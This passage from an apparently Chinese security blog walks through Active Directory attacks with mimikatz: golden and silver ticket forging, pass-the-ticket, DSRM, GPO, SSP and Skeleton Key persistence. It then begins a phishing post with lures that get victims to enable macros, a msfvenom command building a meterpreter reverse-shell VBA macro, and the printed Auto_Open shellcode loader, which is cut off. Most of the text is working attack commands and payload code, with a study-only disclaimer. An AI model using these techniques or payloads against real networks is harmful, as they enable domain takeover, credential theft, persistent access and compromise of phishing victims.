Ticket):由身份认证服务授予的票据**(黄金票据)**，用于身份认证，存储在内存，默认有效期为10小时</li></ul><blockquote><p>黄金票据和白银票据的一些区别</p></blockquote><ul><li><p>访问权限不同</p><ol><li>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限</li><li>Silver Ticket: 伪造TGS,只能访问指定的服务</li></ol></li><li><p>加密方式不同</p><ol><li>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密</li><li>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</li></ol></li><li><p>认证流程不同</p><ol><li>Golden Ticket 的利用过程需要访问域控(KDC)</li><li>Silver Ticket 可以直接跳过 KDC 直接访问对应的服务器</li></ol></li></ul><blockquote><p>Kerberos 的认证过程示意图</p></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/114.png" alt="此处输入图片的描述"></p><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>每个用户的Ticket都是由krbtgt的密码Hash来生成的，所以我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket了。实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/115.png" alt="img"></p><blockquote><p>在域控上执行</p></blockquote><p>可以直接导出<strong>krbtgt</strong>账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/105.png" alt="image-20200808181836535"></p><p>然后找到如下三个信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/domain：ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 <span class="comment">#最后那个502不需要</span></span><br><span class="line">/aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393</span><br></pre></td></tr></table></figure><blockquote><p>生成黄金票据</p></blockquote><p>**Tips:**生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash</p><p>换回我们的windows 10，执行以下命令（普通用户权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /aes256:43fcdd535d27dc9644852c123c4581f69b2046754e0809344dc9cad94f64a393 /user:god /ticket:gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/106.png" alt="image-20200808183201374"></p><p>票据制作成功，接下来导入我们的黄金票据，然后就可以连上域控了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\gold.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/107.png" alt="image-20200808183611223"></p><p><strong>Tips：</strong></p><ol><li>这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好</li><li>可以伪造任意用户，即使其不存在</li><li>krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码</li></ol><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h4><p>Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/108.png" alt="img"></p><blockquote><p>域控上执行</p></blockquote><p>在域控上执行如下命令来获取域控主机的本地管理员账户hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>如果运行该命令报错了主要原因是Windows 8.1 开始为LSA提供了额外的保护（LSA Protection），以防止读取内存和不受保护的进程注入代码。保护模式要求所有加载到LSA的插件都必须使用Microsoft签名进行数字签名。 在LSA Protection保护模式下，mimikatz运行 <code>sekurlsa::logonpasswords</code>抓取密码会报错</p><p>运行如下命令即可绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> /v <span class="string">&quot;RunAsPPL&quot;</span> /t REG_DWORD /d <span class="string">&quot;00000001&quot;</span> /f</span><br></pre></td></tr></table></figure><p>不过这种方法需要重启电脑才行，是不是觉得这样太鸡肋了？莫慌还有一个方式来达到伪重启的方式</p><p>打开powershell然后执行如下两条命令，就是结束了explorer.exe进程在重新启动他即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">taskkill /im explorer.exe /f</span><br><span class="line">start c:\windows\explorer.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/109.png" alt="image-20200808185910908"></p><p>这样就能抓到数据了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/110.png" alt="image-20200808190259737"></p><p>然后我们整理下我们需要的数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/domain:ascotbe.com</span><br><span class="line">/sid:S-1-5-21-4279882978-2535771031-421163639 </span><br><span class="line">/target:WIN-1OUEMJB0766.ascotbe.com</span><br><span class="line">/service:cifs</span><br><span class="line">/rc4:732c27e05330ce4f35f1efc78ecbc42a <span class="comment">#这个是NTLM的值</span></span><br><span class="line">/user:silver <span class="comment">#这个值随意</span></span><br></pre></td></tr></table></figure><blockquote><p>制作白银票据</p></blockquote><p>我们切换到windows 10上面运行如下命令（普通权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:ascotbe.com /sid:S-1-5-21-4279882978-2535771031-421163639  /target:WIN-1OUEMJB0766.ascotbe.com /service:cifs /rc4:732c27e05330ce4f35f1efc78ecbc42a /user:silver /ptt</span><br></pre></td></tr></table></figure><p>成功利用</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/111.png" alt="image-20200808192143902"></p><h4 id="Export-the-ticket"><a href="#Export-the-ticket" class="headerlink" title="Export the ticket"></a>Export the ticket</h4><p>我们也能直接把内存中的黄金票据直接搞出来用，这个时效只有10个小时</p><blockquote><p>域控上运行</p></blockquote><p>通过mimikatz导出内存中的Ticket</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /<span class="built_in">export</span></span><br></pre></td></tr></table></figure><p>然后就会生成这一堆文件了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/112.png" alt="image-20200808193145805"></p><blockquote><p>利用</p></blockquote><p>我们把<code>[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</code>这个文件拷贝到我们的windows 10上面，然后执行（普通权限即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt C:\Users\asc0t6e\Desktop\[0;483d5]-2-0-40e00000-Administrator@krbtgt-ASCOTBE.COM.kirbi</span><br></pre></td></tr></table></figure><p>利用成功，好像票据有点多</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/113.png" alt="image-20200808194619665"></p><h4 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h4><p>占坑有点懵</p><h2 id="域维权"><a href="#域维权" class="headerlink" title="域维权"></a>域维权</h2><p>当拿下域控后，可以在域控上面做一些手脚，以保证后续的权限维持，甚至可以保证，就算域控密码改了，我们依然可以连接。</p><h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>该方法相当于重置了域控机器上的本地管理员密码。</p><p>DSRM，目录服务还原模式，是Windows服务器域控制器的安全模式启动选项。DSRM允许管理员用来修复或还原修复或重建活动目录数据库。DSRM账户实际上就是<strong>Administrator</strong>，也就是域控上面的本地管理员账号，非域管理员账号。当建立域控时，会让我们设置DSRM密码</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/81.png" alt="img"></p><p>我们用如下命令在域控上同步DSRM密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line"><span class="built_in">set</span>  DSRM password</span><br><span class="line">SYNC  FROM DOMAIN ACCOUNT username</span><br><span class="line">Q</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/82.png" alt="image-20200805225934318"></p><p>然后我们用mimikatz查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/83.png" alt="image-20200806201545242"></p><p>可以发现替换成功了，然后再在域控上添加注册表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v  DSRMAdminLogonBehavior /t REG_DWORD /d 2</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/84.png" alt="image-20200806201708182"></p><p>最后我们切换到<strong>Windows 10</strong>用pth连接过去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth  /domain:computername /user:Administrator /ntlm:cd572964d4dec965095d4119ec53e0e2</span><br></pre></td></tr></table></figure><blockquote><p>这边要提一嘴，搞了我好久MMP</p></blockquote><p>这边的<strong>domain</strong>是你电脑名称，不是用户名也不是域控名如下图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/85.png" alt="image-20200806204101914"></p><p>最终我们连接上了目标</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/86.png" alt="image-20200806204006515"></p><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>当我们获取到管理员权限时，可以通过添加组策略手段，实现用户开机自启动，jumbo师傅没有提的一点我提一下，运行的脚本需要放到访问共享中，不然其他机器没办法加载我们的脚本的</p><p>域控上执行过程如下：</p><p>首先建立共享</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/87.png" alt="image-20200806214504438"></p><p>如图所示netlogon、sysvol 共享文件夹为升级域控建立的共享文件夹。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/88.png" alt="image-20200806214553597"></p><p>这两个文件夹有些机器是没办法访问的，我们打开高级共享设置</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/89.png" alt="image-20200806221953976"></p><p>然后把这三个位置的启动共享都给打开</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/90.png" alt="image-20200806222101138"></p><p>接下来我们切换到Windows10看共享文件夹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/91.png" alt="image-20200806222201365"></p><p>可以看到多了个Users文件，然后我们切换回windows2008，将之前做好的bat文件复制到如下共享文件目录。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/92.png" alt="image-20200806222315575"></p><p>我是复制到这个目录下，只要在这个目录下的任意文件夹都可以，接着打开gpmc.msc ，编辑默认组策略</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/93.png" alt="image-20200806204517983"></p><p>然后添加启动项</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/94.png" alt="image-20200806204619026"></p><p>然后在登录位置添加脚本</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/95.png" alt="image-20200806214935776"></p><p>点击浏览后把我们先共享的路径复制过去</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/96.png" alt="image-20200806222454472"></p><p>接着点击确定就好</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/97.png" alt="image-20200806222526281"></p><p>再执行如下命令强制刷新组策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate  /force</span><br></pre></td></tr></table></figure><p>重启Windows10就能看到执行了我们的脚本，同理还可以设置powershell脚本</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/98.png" alt="image-20200806222804243"></p><p>也可以添加计划任务</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/99.png" alt="image-20200806220219836"></p><p>具体自己设置即可</p><h3 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h3><p>　SSP（Security Support Provider）是windows操作系统安全机制的提供者。简单的说，SSP就是DLL文件，主要用于windows操作系统的身份认证功能，例如NTLM、Kerberos、Negotiate、Secure Channel（Schannel）、Digest、Credential（CredSSP）。</p><p>　　SSPI（Security Support Provider Interface，安全支持提供程序接口）是windows操作系统在执行认证操作时使用的API接口。可以说SSPI就是SSP的API接口。</p><p>如果获得目标系统system权限，可以使用该方法进行持久化操作。其主要原理是：LSA（Local Security Authority）用于身份验证；lsass.exe作为windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe 进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样即使用户更改密码并重新登录，攻击者依然可以获得该账号的新密码。</p><p><strong>利用mimikatz来完成</strong></p><ul><li>将mimilib.dll复制到域控<strong>c:\windows\system32</strong></li><li>添加注册表:<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\SecurityPackages\</code>中</li><li>重启后记录登录的密码</li></ul><p>具体代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy mimilib.dll %systemroot%\system32</span><br><span class="line">reg query hklm\system\currentcontrolset\control\lsa\ /v <span class="string">&quot;Security Packages&quot;</span></span><br><span class="line">reg add <span class="string">&quot;hklm\system\currentcontrolset\control\lsa\&quot; /v &quot;</span>Security Packages<span class="string">&quot; /d &quot;</span>kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib<span class="string">&quot; /t REG_MULTI_SZ</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/100.png" alt="image-20200806224652440"></p><p>然后重启后查看文件</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/101.png" alt="image-20200806225606582"></p><h3 id="Skeleton-Key"><a href="#Skeleton-Key" class="headerlink" title="Skeleton Key"></a>Skeleton Key</h3><p>利用mimikatz安装一个万能密码<code>mimikatz</code>，实现代码可以参考如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz&#x2F;blob&#x2F;master&#x2F;mimikatz&#x2F;modules&#x2F;kuhl_m_misc.c</span><br></pre></td></tr></table></figure><p>执行完一下命令就可以使用<code>mimikatz</code>作为一个万能密码，去连接域控，该方法可用于当域控密码被改掉时，我们依然可以去控制域控。</p><blockquote><p>注意X64机器要使用X64版本的mimikatz</p></blockquote><p>在域控上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/102.png" alt="image-20200806230603129"></p><p>在域内主机上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\WIN-1OUEMJB0766.ascotbe.com <span class="string">&quot;mimikatz&quot;</span> /user:ascotbe.com\administrator</span><br><span class="line">dir \\WIN-1OUEMJB0766.ascotbe.com\c$</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/103.png" alt="image-20200806231009027"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;payloads.online&#x2F;archivers&#x2F;2019-04-13&#x2F;1</span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s?__biz&#x3D;MjM5NzE1NjA0MQ&#x3D;&#x3D;&amp;mid&#x3D;2651202058&amp;idx&#x3D;1&amp;sn&#x3D;d3d57af49cea5f15d2c58b83bac35b7d&amp;chksm&#x3D;bd2cc7ac8a5b4ebafac72bb78d523f4956804a0d063f9e33f0f49ace2417a6c392738947330a&amp;mpshare&#x3D;1&amp;scene&#x3D;1&amp;srcid&#x3D;0728NuHlnt4yB5qhc3gWClqQ&amp;sharer_sharetime&#x3D;1595949460134&amp;sharer_shareid&#x3D;de4f8e5a5ad7bd6a89317b77fa1ff085#rd</span><br><span class="line">https:&#x2F;&#x2F;man.linuxde.net&#x2F;ssh</span><br><span class="line">http:&#x2F;&#x2F;linux.51yip.com&#x2F;search&#x2F;ssh</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;ccfxue&#x2F;article&#x2F;details&#x2F;53159896</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;2527</span><br><span class="line">https:&#x2F;&#x2F;www.codenong.com&#x2F;cs105941102&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;MS_Tony_Shu&#x2F;article&#x2F;details&#x2F;93723432</span><br><span class="line">https:&#x2F;&#x2F;wooyun.js.org&#x2F;drops&#x2F;%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6943</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>关于邮件钓鱼的哪些事</title>
    <link href="https://www.ascotbe.com/2020/07/26/Office_0x01/"/>
    <id>https://www.ascotbe.com/2020/07/26/Office_0x01/</id>
    <published>2020-07-26T13:45:42.000Z</published>
    <updated>2021-05-17T00:31:53.721Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>漏洞利用那一节放到下篇吧，复现环境有点难找</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul><li>kail-2019.4</li><li>windows7 sp1 x64</li><li>windows10 x64</li></ul><h2 id="Office宏"><a href="#Office宏" class="headerlink" title="Office宏"></a>Office宏</h2><h3 id="首先来区别下Word和Excel各种后缀中的区别"><a href="#首先来区别下Word和Excel各种后缀中的区别" class="headerlink" title="首先来区别下Word和Excel各种后缀中的区别"></a>首先来区别下Word和Excel各种后缀中的区别</h3><h4 id="Word文档"><a href="#Word文档" class="headerlink" title="Word文档"></a>Word文档</h4><p>97-2003的旧版本文件名后缀就是**.doc**</p><p>从2007版以后后缀名是**.docx**</p><p><strong>docx</strong>厉害一点。它是被压缩过的文档，体积更小，能处理更加复杂的内容，访问速度更快。</p><p>如果把<strong>docx</strong>的改为<strong>zip</strong>的话可以解压出里面的所有数据，不过空文档大部分都是<strong>XM</strong>格式的文件</p><h4 id="Excel表格"><a href="#Excel表格" class="headerlink" title="Excel表格"></a>Excel表格</h4><p><strong>xls</strong>是一个特有的二进制格式，其核心结构是复合文档类型的结构，而<strong>xlsx</strong>的核心结构是<strong>XML</strong>类型的结构，采用的是基于<strong>XML</strong>的压缩方式，使其占用的空间更小。<strong>xlsx</strong>中最后一个x的意义就在于此。</p><p><strong>xls</strong>是2003版本下的文件 ，不管有没有宏程序的话都是<strong>xls</strong>文件 ，从2007开始做了区分，<strong>xlsm</strong>文件和<strong>xlsx</strong>文件都是excel 2007及其以后的文件，但前者是含有宏启用，Excel中默认情况下不自动启用宏，默认是<strong>xlsx</strong>。VBA中，如果不想保存代码，可以保存为<strong>xlsx</strong>，即可自动删除其中VBA代码，反之则保存为<strong>xlsm</strong>文件。</p><h3 id="如何诱导"><a href="#如何诱导" class="headerlink" title="如何诱导"></a>如何诱导</h3><p>宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。由于早些年宏病毒泛滥，现在Office的宏功能已经默认是禁用，但依然无法阻挡攻击者使用宏。那么如何引诱受害者开启宏功能就是关键了，常用的套路</p><ul><li>文档是被保护状态，需要启用宏才能查看；</li><li>添加一张模糊的图片，提示需要启用宏才能查看高清图片；</li><li>提示要查看文档，按给出的一系列步骤操作；</li><li>贴一张某杀毒软件的Logo图片，暗示文档被安全软件保护。</li></ul><h3 id="制作简单的宏文件"><a href="#制作简单的宏文件" class="headerlink" title="制作简单的宏文件"></a>制作简单的宏文件</h3><p>这边以Word文档来举例吧，会的大佬直接跳过，感觉整片会被跳过了（逃</p><p>先创建个文档<strong>doc</strong>和<strong>docx</strong>都行个人感觉没啥区别，如果是<strong>doc</strong>的话兼容性会更好</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/1.png" alt="image-20200726202103886"></p><p>记得要开宏，默认是关的就很难受</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/2.png" alt="image-20200726202204961"></p><p>然后在视图位置点击添加宏</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/3.png" alt="image-20200726202317197"></p><p>然后添加后是这么一个玩意</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/Offer/4.png" alt="image-20200726202406765"></p><p>接下来就是一些语法了，和常规编程差不多，各位应该看一眼就会了，然后该死的macOS11让我用不了虚拟机，这边全程使用windows来测试</p><p>首先我们来用msf生成个宏</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.183.138 LPORT&#x3D;7890 -f vba -o ascotbe.vba</span><br></pre></td></tr></table></figure><p>这是我们生成的宏</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> LongPtr, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> PtrSafe <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> LongPtr, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> CreateThread <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Nyeo <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Pjfdx <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Acbomfr <span class="keyword">As</span> <span class="type">Long</span>, Gpzfu <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Groc <span class="keyword">As</span> <span class="type">Long</span>, Qrepb <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> VirtualAlloc <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Rpwgaj <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Ddbv <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Jduvicamq <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByVal</span> Glwnku <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">        <span class="keyword">Private</span> <span class="keyword">Declare</span> <span class="keyword">Function</span> RtlMoveMemory <span class="keyword">Lib</span> <span class="string">&quot;kernel32&quot;</span> (<span class="keyword">ByVal</span> Raftpjwrc <span class="keyword">As</span> <span class="type">Long</span>, <span class="keyword">ByRef</span> Wjiefyrxe <span class="keyword">As</span> Any, <span class="keyword">ByVal</span> Nvyyuvidk <span class="keyword">As</span> <span class="type">Long</span>) <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">        Dim Imtzv As Long, Laclv As Variant, Whxffnbhl As Long</span><br><span class="line"><span class="meta">#<span class="meta-keyword">If</span> Vba7 <span class="meta-keyword">Then</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> LongPtr, Hyub <span class="keyword">As</span> LongPtr</span><br><span class="line"><span class="meta">#<span class="meta-keyword">Else</span></span></span><br><span class="line">        <span class="keyword">Dim</span>  Esc <span class="keyword">As</span> <span class="type">Long</span>, Hyub <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">#EndIf</span><br><span class="line">        Laclv = Array(<span class="number">72</span>,<span class="number">131</span>,<span class="number">228</span>,<span class="number">240</span>,<span class="number">232</span>,<span class="number">204</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span 